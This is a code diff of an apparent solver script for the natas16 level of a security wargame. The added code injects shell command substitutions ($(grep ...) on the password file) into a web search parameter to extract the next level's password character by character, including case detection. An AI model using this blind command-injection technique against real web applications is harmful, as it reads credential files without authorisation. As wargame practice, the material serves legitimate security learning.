@@ -1,5 +1,8 @@
 """
 natas16: shell injection, more filtering
+
+Redirection with <, <<, <<<, etc. doesn't work even though '<' isn't explicitly
+filtered.
 """
 
 import itertools
@@ -12,19 +15,18 @@ from natas_utils import *
 LEVEL = 16
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    flag_chars = list()
+    flag = ""
 
     # passwords are all the same length
-    for offset in range(1, len(NATAS_DATA["logins"][16]["password"])):
+    for offset in range(1, len(NATAS_DATA["logins"][16]["password"]) + 1):
         c = extract_character(url, login, offset)
         if not c:
             return None
-        flag_chars.append(c)
+        flag += c
 
-    candidates = map(lambda product: ''.join(product), itertools.product(*flag_chars))
-    return try_level_login(LEVEL + 1, candidates)
+    return try_level_login(LEVEL + 1, [flag])
 
-def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[Union[Tuple[str, str], Tuple[str]]]:
+def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[str]:
     flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
 
     # Preliminary payload: match first chars of words against selected char in password.
@@ -44,10 +46,24 @@ def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[Unio
     else:
         return extract_digit(url, login, offset)
 
-def extract_alphabetic_case(url: str, login: LevelLogin, offset: int, char: str) -> Optional[Tuple[str, str]]:
-    return None
+def extract_alphabetic_case(url: str, login: LevelLogin, offset: int, char: str) -> str:
+    flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
 
-def extract_digit(url: str, login: LevelLogin, offset: int) -> Optional[Tuple[str]]:
+    # attempt to match uppercase character (will only return results on match)
+    case_payload = f"[$(grep ^{'.' * (offset - 1)}{char.upper()} {flag_file_abspath})]"
+
+    params = {
+        "needle": case_payload,
+        "submit": "Search",
+    }
+    response = requests.get(url, auth=login, params=params)
+
+    if len(get_grep_output(response)) > 0:
+        return char.upper()
+    else:
+        return char.lower()
+
+def extract_digit(url: str, login: LevelLogin, offset: int) -> Optional[str]:
     flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
 
     # if no character match, char is likely a digit
@@ -71,7 +87,7 @@ def extract_digit(url: str, login: LevelLogin, offset: int) -> Optional[Tuple[st
         results = get_grep_output(response_0)
 
     # now if the results are still empty, something has gone wrong
-    return None if not len(results) > 0 else (str(len(results[0]))[-1],)
+    return None if not len(results) > 0 else str(len(results[0]))[-1]
 
 def get_grep_output(response: requests.Response) -> List[str]:
     soup = BeautifulSoup(response.text, "html.parser")
